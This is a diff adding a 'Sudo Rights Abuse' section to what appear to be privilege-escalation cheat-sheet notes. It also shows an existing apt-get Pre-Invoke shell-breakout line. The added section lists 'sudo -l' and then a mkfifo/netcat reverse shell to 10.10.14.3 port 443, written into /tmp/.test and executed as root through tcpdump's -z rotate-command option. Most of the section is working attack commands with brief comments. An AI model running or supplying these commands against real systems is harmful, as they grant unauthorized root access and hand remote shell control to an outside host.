@@ -223,3 +223,16 @@ $ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
 ```
 %% apt-get can be used to break out of restricted environments and spawn a shell by adding a Pre-Invoke command %%
 
+### Sudo Rights Abuse
+```
+$ sudo -l
+```
+%% check if current user has any sudo privileges %%
+
+```
+$ cat /tmp/.test
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
+$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+```
+
+
